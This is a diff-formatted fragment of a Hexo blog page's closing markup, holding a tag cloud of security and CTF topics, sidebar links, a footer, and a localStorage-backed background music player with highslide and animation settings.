+    <a href="/tags/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7/" style="font-size: 11.800431726354958px;" class="tag-cloud-link">动态调试工具</a>
+    
+    <a href="/tags/%E5%85%B6%E4%BB%96%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7/" style="font-size: 18.75221035540585px;" class="tag-cloud-link">其他辅助工具</a>
+    
+    <a href="/tags/AI-Agent/" style="font-size: 18.70379540417386px;" class="tag-cloud-link">AI Agent</a>
+    
+    <a href="/tags/retoolkit/" style="font-size: 18.924730167972807px;" class="tag-cloud-link">retoolkit</a>
+    
+    <a href="/tags/%E7%88%B1%E7%9B%98/" style="font-size: 12.07950165671906px;" class="tag-cloud-link">爱盘</a>
+    
+    <a href="/tags/SandBox/" style="font-size: 19.812182817390607px;" class="tag-cloud-link">SandBox</a>
+    
+    <a href="/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" style="font-size: 15.500665260352354px;" class="tag-cloud-link">沙箱逃逸</a>
+    
+    <a href="/tags/%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" style="font-size: 8.498014428000195px;" class="tag-cloud-link">魔术方法</a>
+    
+    <a href="/tags/Pyjail/" style="font-size: 11.492610753246442px;" class="tag-cloud-link">Pyjail</a>
+    
+    <a href="/tags/jsjail/" style="font-size: 10.778094027285551px;" class="tag-cloud-link">jsjail</a>
+    
+    <a href="/tags/bashjail/" style="font-size: 15.591064662946774px;" class="tag-cloud-link">bashjail</a>
+    
+    <a href="/tags/Cjail/" style="font-size: 16.207013429846167px;" class="tag-cloud-link">Cjail</a>
+    
+    <a href="/tags/nc%E8%BF%9E%E6%8E%A5%E8%BF%9C%E7%A8%8B%E9%9D%B6%E6%9C%BA/" style="font-size: 17.025665959756655px;" class="tag-cloud-link">nc连接远程靶机</a>
+    
+    <a href="/tags/%E5%AD%97%E7%AC%A6%E8%BF%87%E6%BB%A4/" style="font-size: 9.080435949852383px;" class="tag-cloud-link">字符过滤</a>
+    
+    <a href="/tags/%E5%AF%B9%E8%B1%A1%E5%85%B3%E7%B3%BB%E9%93%BE/" style="font-size: 15.326253360859672px;" class="tag-cloud-link">对象关系链</a>
+    
+    <a href="/tags/Typhon-Pyjail%E4%B8%80%E6%8A%8A%E6%A2%AD%E5%B7%A5%E5%85%B7/" style="font-size: 15.137794600846727px;" class="tag-cloud-link">Typhon(Pyjail一把梭工具)</a>
+    
+    <a href="/tags/Web/" style="font-size: 16.082231985752323px;" class="tag-cloud-link">Web</a>
+    
+    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 19.974646750976333px;" class="tag-cloud-link">渗透测试</a>
+    
+    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 10.115556945550583px;" class="tag-cloud-link">网络协议</a>
+    
+    <a href="/tags/%E5%89%8D%E7%AB%AF%E4%B8%89%E4%BB%B6%E5%A5%97/" style="font-size: 8.058108557455505px;" class="tag-cloud-link">前端三件套</a>
+    
+    <a href="/tags/%E5%90%8E%E7%AB%AF/" style="font-size: 16.788359534242243px;" class="tag-cloud-link">后端</a>
+    
+    <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8ESQL/" style="font-size: 19.032761550204256px;" class="tag-cloud-link">数据库与SQL</a>
+    
+    <a href="/tags/Web%E5%AE%89%E5%85%A8%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 15.260191619944083px;" class="tag-cloud-link">Web安全与渗透测试</a>
+    
+    <a href="/tags/%E7%BC%96%E7%A0%81%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F/" style="font-size: 19.767544090984885px;" class="tag-cloud-link">编码与数据格式</a>
+    
+    <a href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%BC%80%E5%8F%91%E8%80%85%E5%B7%A5%E5%85%B7/" style="font-size: 17.260747398077825px;" class="tag-cloud-link">浏览器开发者工具</a>
+    
+    <a href="/tags/Burp-Suite/" style="font-size: 8.7277887227716px;" class="tag-cloud-link">Burp Suite</a>
+    
+    <a href="/tags/Yakit/" style="font-size: 15.008499679615449px;" class="tag-cloud-link">Yakit</a>
+    
+    <a href="/tags/curl/" style="font-size: 18.423593903095657px;" class="tag-cloud-link">curl</a>
+    
+    <a href="/tags/CyberChef/" style="font-size: 9.081448596774464px;" class="tag-cloud-link">CyberChef</a>
+    
+    <a href="/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/" style="font-size: 16.023434711991882px;" class="tag-cloud-link">虚拟机</a>
+    
+    <a href="/tags/Docker/" style="font-size: 8.551650598566182px;" class="tag-cloud-link">Docker</a>
+    
+    <a href="/tags/XSS-Platform/" style="font-size: 18.335860948468266px;" class="tag-cloud-link">XSS Platform</a>
+    
+    <a href="/tags/misc/" style="font-size: 10.035001260168103px;" class="tag-cloud-link">misc</a>
+    
+    <a href="/tags/%E5%8F%96%E8%AF%81%E4%B8%8E%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9/" style="font-size: 17.813337540134068px;" class="tag-cloud-link">取证与安全杂项</a>
+    
+    <a href="/tags/Bing/" style="font-size: 16.977861793988843px;" class="tag-cloud-link">Bing</a>
+    
+    <a href="/tags/Google/" style="font-size: 15.70170181938625px;" class="tag-cloud-link">Google</a>
+    
+    <a href="/tags/Recon/" style="font-size: 17.44188760214787px;" class="tag-cloud-link">Recon</a>
+    
+    <a href="/tags/Encoding/" style="font-size: 12.76708655378745px;" class="tag-cloud-link">Encoding</a>
+    
+    <a href="/tags/Stego/" style="font-size: 14.653979963654947px;" class="tag-cloud-link">Stego</a>
+    
+    <a href="/tags/Forensics/" style="font-size: 19.309436461084008px;" class="tag-cloud-link">Forensics</a>
+    
+    <a href="/tags/Traffic/" style="font-size: 18.076450822450617px;" class="tag-cloud-link">Traffic</a>
+    
+    <a href="/tags/Blockchain/" style="font-size: 8.222539143921846px;" class="tag-cloud-link">Blockchain</a>
+    
+    <a href="/tags/Audacity/" style="font-size: 9.601054104584634px;" class="tag-cloud-link">Audacity</a>
+    
+    <a href="/tags/Aperi-Solve/" style="font-size: 15.846740972185888px;" class="tag-cloud-link">Aperi&#39;Solve</a>
+    
+    <a href="/tags/Stegsolve/" style="font-size: 12.73266966103941px;" class="tag-cloud-link">Stegsolve</a>
+    
+    <a href="/tags/exiftool/" style="font-size: 14.779175745589644px;" class="tag-cloud-link">exiftool</a>
+    
+</div>
+                
+                
+                <div class="friend-links tab-pane nav bs-sidenav fade" id="sidebar-friend-links">
+    
+    <li>
+        <a href="https://oi-wiki.org/" target="_blank">OI Wiki</a>
+    </li>
+    
+    <li>
+        <a href="https://ctf-wiki.org/" target="_blank">CTF WikiWiki</a>
+    </li>
+    
+    <li>
+        <a href="https://jyywiki.cn/" target="_blank">Yanyan&#39;s wiki</a>
+    </li>
+    
+</div>
+                
+                
+                <div class="links tab-pane nav bs-sidenav fade" id="sidebar-links">
+    
+    <li>
+        <a href="https://github.com/Augenstern-W/" target="_blank">Github</a>
+    </li>
+    
+    <li>
+        <a href="https://coding.net/u/SORA1" target="_blank">Coding</a>
+    </li>
+    
+    <li>
+        <a href="https://www.zhihu.com/people/aonosora/activities" target="_blank">知乎</a>
+    </li>
+    
+</div>
+                
+            </div>
+        </div>
+    </aside>
+    
+</aside>
+            </div>
+        </div>
+    </div>
+    <footer id="gal-footer">
+    <div class="container">
+        Copyright © 2018 忘江湖 Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.
+    </div>
+</footer>
+
+<!-- 回到顶端 -->
+<div id="gal-gotop">
+    <i class="fa fa-angle-up"></i>
+</div>
+    
+<div id="gal-music">
+    <button type="button" id="music-fab" class="music-fab" title="音乐">
+        <i class="fa fa-music"></i>
+    </button>
+    <div id="music-panel" class="music-panel">
+        <div class="music-head">
+            <span id="music-title">♫ 未播放</span>
+            <div class="music-head-btns">
+                <div class="music-vol-wrap">
+                    <button type="button" id="music-volume" class="music-close" title="静音 / 取消静音（悬停调音量）"><i class="fa fa-volume-up"></i></button>
+                    <div class="music-vol-pop">
+                        <input type="range" id="music-vol" min="0" max="100" step="1" value="70">
+                        <span id="music-val">70%</span>
+                    </div>
+                </div>
+                <button type="button" id="music-close" class="music-close" title="收起"><i class="fa fa-chevron-down"></i></button>
+            </div>
+        </div>
+        <div class="music-progress">
+            <span id="music-cur">0:00</span>
+            <input type="range" id="music-progress" min="0" max="100" step="0.1" value="0">
+            <span id="music-dur">0:00</span>
+        </div>
+        <div class="music-bar">
+            <button type="button" id="music-prev" title="上一首"><i class="fa fa-backward"></i></button>
+            <button type="button" id="music-play" title="播放 / 暂停"><i class="fa fa-play"></i></button>
+            <button type="button" id="music-next" title="下一首"><i class="fa fa-forward"></i></button>
+            <button type="button" id="music-speed" title="切换倍速">1.0x</button>
+        </div>
+        <audio id="music-audio" preload="metadata" autoplay muted></audio>
+    </div>
+</div>
+
+<style>
+#gal-music {
+    position: fixed;
+    left: 16px;
+    bottom: 16px;
+    z-index: 9999;
+}
+#gal-music .music-fab {
+    width: 48px;
+    height: 48px;
+    border: none;
+    border-radius: 50%;
+    background: rgba(30, 30, 30, 0.65);
+    color: #fff;
+    font-size: 20px;
+    cursor: pointer;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.35);
+    transition: background 0.2s, transform 0.2s;
+}
+#gal-music .music-fab:hover {
+    background: rgba(30, 30, 30, 0.9);
+    transform: scale(1.08);
+}
+#gal-music .music-panel {
+    display: none;
+    position: absolute;
+    left: 0;
+    bottom: 58px;
+    width: 230px;
+    background: rgba(20, 20, 20, 0.82);
+    color: #eee;
+    border-radius: 10px;
+    padding: 12px;
+    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4);
+}
+#gal-music .music-head {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 10px;
+}
+#gal-music .music-head #music-title {
+    font-size: 13px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    max-width: 150px;
+}
+#gal-music .music-head-btns {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+}
+#gal-music .music-close {
+    border: none;
+    background: transparent;
+    color: #ccc;
+    cursor: pointer;
+    font-size: 14px;
+    padding: 0;
+}
+#gal-music .music-progress {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    margin-bottom: 10px;
+    font-size: 11px;
+    color: #bbb;
+}
+#gal-music .music-progress input[type="range"] {
+    flex: 1;
+    margin: 0;
+    cursor: pointer;
+}
+#gal-music .music-vol-wrap {
+    position: relative;
+    display: flex;
+    align-items: center;
+}
+#gal-music .music-vol-pop {
+    display: none;
+    position: absolute;
+    left: 50%;
+    transform: translateX(-50%);
+    bottom: 100%;
+    width: 36px;
+    height: 112px;
+    border-top: 12px solid transparent;
+    background: rgba(20, 20, 20, 0.95) padding-box;
+    border-radius: 8px;
+    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4);
+}
+#gal-music .music-vol-wrap:hover .music-vol-pop {
+    display: block;
+}
+#gal-music .music-vol-pop #music-vol {
+    position: absolute;
+    width: 76px;
+    left: 50%;
+    top: 40px;
+    transform: translate(-50%, -50%) rotate(-90deg);
+    margin: 0;
+    cursor: pointer;
+}
+#gal-music .music-vol-pop #music-val {
+    position: absolute;
+    left: 0;
+    right: 0;
+    bottom: 8px;
+    text-align: center;
+    font-size: 11px;
+    color: #bbb;
+    line-height: 1;
+}
+#gal-music input[type="range"] {
+    accent-color: #6cf;
+}
+#gal-music .music-bar {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+#gal-music .music-bar button {
+    flex: 1;
+    border: none;
+    background: rgba(255, 255, 255, 0.12);
+    color: #fff;
+    border-radius: 6px;
+    padding: 8px 0;
+    cursor: pointer;
+    font-size: 14px;
+    transition: background 0.2s;
+}
+#gal-music .music-bar button:hover {
+    background: rgba(255, 255, 255, 0.25);
+}
+#gal-music .music-bar #music-speed {
+    flex: 0 0 52px;
+    font-size: 12px;
+}
+</style>
+
+<script>
+(function () {
+    var songs = [{"name":"兰亭序","url":"/music/%E5%85%B0%E4%BA%AD%E5%BA%8F.mp3"},{"name":"发如雪","url":"/music/%E5%8F%91%E5%A6%82%E9%9B%AA.mp3"},{"name":"天涯过客","url":"/music/%E5%A4%A9%E6%B6%AF%E8%BF%87%E5%AE%A2.mp3"},{"name":"烟花易冷","url":"/music/%E7%83%9F%E8%8A%B1%E6%98%93%E5%86%B7.mp3"},{"name":"红尘客栈","url":"/music/%E7%BA%A2%E5%B0%98%E5%AE%A2%E6%A0%88.mp3"},{"name":"红颜如霜","url":"/music/%E7%BA%A2%E9%A2%9C%E5%A6%82%E9%9C%9C.mp3"},{"name":"青花瓷","url":"/music/%E9%9D%92%E8%8A%B1%E7%93%B7.mp3"}];
+    if (!songs.length) return;
+
+    var audio = document.getElementById('music-audio');
+    var fab = document.getElementById('music-fab');
+    var panel = document.getElementById('music-panel');
+    var closeBtn = document.getElementById('music-close');
+    var volumeBtn = document.getElementById('music-volume');
+    var titleEl = document.getElementById('music-title');
+    var playBtn = document.getElementById('music-play');
+    var prevBtn = document.getElementById('music-prev');
+    var nextBtn = document.getElementById('music-next');
+    var speedBtn = document.getElementById('music-speed');
+    var progressEl = document.getElementById('music-progress');
+    var curEl = document.getElementById('music-cur');
+    var durEl = document.getElementById('music-dur');
+    var volEl = document.getElementById('music-vol');
+    var valEl = document.getElementById('music-val');
+
+    var speeds = [0.75, 1, 1.25, 1.5, 2];
+    var current = 0;
+    var speedIndex = 1;
+    var playing = false;
+    var seeking = false;
+    var autoMutedByBrowser = false;
+
+    // 播放状态记忆：跨页面跳转后自动接着上次位置继续播放
+    var STATE_KEY = 'gal-music-state';
+    var resumeTime = 0;
+    function restoreState() {
+        try { return JSON.parse(localStorage.getItem(STATE_KEY) || 'null'); }
+        catch (e) { return null; }
+    }
+    function saveState() {
+        try {
+            localStorage.setItem(STATE_KEY, JSON.stringify({
+                i: current,
+                t: audio.currentTime || 0,
+                r: audio.playbackRate,
+                v: audio.volume
+            }));
+        } catch (e) {}
+    }
+
+    function formatTime(s) {
+        if (!isFinite(s) || s < 0) s = 0;
+        s = Math.floor(s);
+        var m = Math.floor(s / 60);
+        var sec = s % 60;
+        return m + ':' + (sec < 10 ? '0' + sec : sec);
+    }
+
+    function setVolumeUI() {
+        volumeBtn.innerHTML = audio.muted ? '<i class="fa fa-volume-off"></i>' : '<i class="fa fa-volume-up"></i>';
+        valEl.textContent = Math.round(audio.volume * 100) + '%';
+    }
+
+    function load(index) {
+        current = (index + songs.length) % songs.length;
+        audio.src = songs[current].url;
+        titleEl.textContent = '♫ ' + songs[current].name;
+        progressEl.value = 0;
+        curEl.textContent = '0:00';
+        durEl.textContent = '0:00';
+        // 若上次记录的就是这首歌，则恢复到上次播放位置
+        var st = restoreState();
+        resumeTime = (st && st.i === current && st.t > 1) ? st.t : 0;
+    }
+
+    function togglePlay() {
+        if (playing) {
+            audio.pause();
+        } else {
+            if (!audio.src) load(current);
+            audio.play();
+        }
+    }
+
+    function next() { load(current + 1); if (playing) audio.play(); }
+    function prev() { load(current - 1); if (playing) audio.play(); }
+
+    audio.addEventListener('play', function () {
+        playing = true;
+        playBtn.innerHTML = '<i class="fa fa-pause"></i>';
+    });
+    audio.addEventListener('pause', function () {
+        playing = false;
+        playBtn.innerHTML = '<i class="fa fa-play"></i>';
+        saveState();
+    });
+    audio.addEventListener('ended', function () {
+        // 列表循环，播放完自动切下一首
+        saveState();
+        load(current + 1);
+        audio.play();
+    });
+    audio.addEventListener('loadedmetadata', function () {
+        progressEl.max = audio.duration || 100;
+        durEl.textContent = formatTime(audio.duration);
+        // 恢复上次播放位置（需在元数据加载后设置 currentTime 才可靠）
+        if (resumeTime > 0 && resumeTime < audio.duration) {
+            audio.currentTime = resumeTime;
+            progressEl.value = resumeTime;
+            curEl.textContent = formatTime(resumeTime);
+        }
+        resumeTime = 0;
+    });
+    var lastSave = 0;
+    audio.addEventListener('timeupdate', function () {
+        if (!seeking && audio.duration) {
+            progressEl.value = audio.currentTime;
+            curEl.textContent = formatTime(audio.currentTime);
+        }
+        // 播放中每 2 秒保存一次进度
+        var now = Date.now();
+        if (!audio.paused && now - lastSave > 2000) {
+            lastSave = now;
+            saveState();
+        }
+    });
+
+    fab.addEventListener('click', function () {
+        panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
+    });
+    closeBtn.addEventListener('click', function () {
+        panel.style.display = 'none';
+    });
+    volumeBtn.addEventListener('click', function () {
+        audio.muted = !audio.muted;
+        autoMutedByBrowser = false;
+        setVolumeUI();
+    });
+    playBtn.addEventListener('click', togglePlay);
+    nextBtn.addEventListener('click', next);
+    prevBtn.addEventListener('click', prev);
+    speedBtn.addEventListener('click', function () {
+        speedIndex = (speedIndex + 1) % speeds.length;
+        audio.playbackRate = speeds[speedIndex];
+        speedBtn.textContent = speeds[speedIndex] + 'x';
+    });
+
+    progressEl.addEventListener('mousedown', function () { seeking = true; });
+    progressEl.addEventListener('touchstart', function () { seeking = true; });
+    progressEl.addEventListener('mouseup', function () { seeking = false; });
+    progressEl.addEventListener('touchend', function () { seeking = false; });
+    progressEl.addEventListener('input', function () {
+        audio.currentTime = progressEl.value;
+        curEl.textContent = formatTime(audio.currentTime);
+    });
+
+    // 音量调节（默认 70%）
+    audio.volume = 0.7;
+    volEl.value = 70;
+    setVolumeUI();
+    volEl.addEventListener('input', function () {
+        audio.volume = volEl.value / 100;
+        if (audio.muted) audio.muted = false;
+        autoMutedByBrowser = false;
+        setVolumeUI();
+    });
+
+    // 被浏览器静音自动播放后，用户首次点击页面任意位置即恢复声音
+    document.addEventListener('click', function () {
+        if (autoMutedByBrowser) {
+            autoMutedByBrowser = false;
+            audio.muted = false;
+            setVolumeUI();
+        }
+    }, true);
+
+    // 离开页面前保存一次，保证跳转后能精准续播
+    window.addEventListener('beforeunload', saveState);
+
+    // 打开网站默认自动播放；若被浏览器拦截则静音自动播放，
+    // 待用户首次点击页面任意位置后恢复声音
+    var saved = restoreState();
+    if (saved && typeof saved.i === 'number' && saved.i >= 0 && saved.i < songs.length) {
+        // 恢复上次的歌曲、倍速和音量
+        load(saved.i);
+        if (saved.r && speeds.indexOf(saved.r) !== -1) {
+            speedIndex = speeds.indexOf(saved.r);
+            audio.playbackRate = saved.r;
+            speedBtn.textContent = saved.r + 'x';
+        }
+        if (typeof saved.v === 'number' && saved.v > 0 && saved.v <= 1) {
+            audio.volume = saved.v;
+            volEl.value = Math.round(saved.v * 100);
+        }
+    } else {
+        load(0);
+    }
+    setVolumeUI();
+    var autoPlay = audio.play();
+    if (autoPlay && typeof autoPlay.catch === 'function') {
+        autoPlay.catch(function () {
+            audio.muted = true;
+            setVolumeUI();
+            autoMutedByBrowser = true;
+            audio.play().catch(function () {});
+        });
+    }
+
+})();
+</script>
+
+
+</body>
+
+<script src="/js/activate-power-mode.js"></script>
+
+<script>
+
+    // 配置highslide
+	hs.graphicsDir = '/js/highslide/graphics/'
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.lang.number = '共%2张图, 当前是第%1张';
+    hs.addSlideshow({
+      interval: 5000,
+      repeat: true,
+      useControls: true,
+      fixedControls: "fit",
+      overlayOptions: {
+        opacity: 0.75,
+        position: "bottom center",
+        hideOnMouseOut: true
+      }
+    })
+
+    // 初始化aos
+    AOS.init({
+      duration: 1000,
+      delay: 0,
+      easing: 'ease-out-back'
+    });
+
+</script>
+<script>
+	POWERMODE.colorful = 'true';    // make power mode colorful
+	POWERMODE.shake = 'true';       // turn off shake
+	// TODO 这里根据具体情况修改
+	document.body.addEventListener('input', POWERMODE);
+</script>
+<script>
+    window.slideConfig = {
+      prefix: '/imgs/slide/background',
+      ext: 'jpg',
+      maxCount: '6'
+    }
+</script>
+
+<script src="/js/hs.js"></script>
+<script src="/js/blog.js"></script>
+
+
+
+</html>
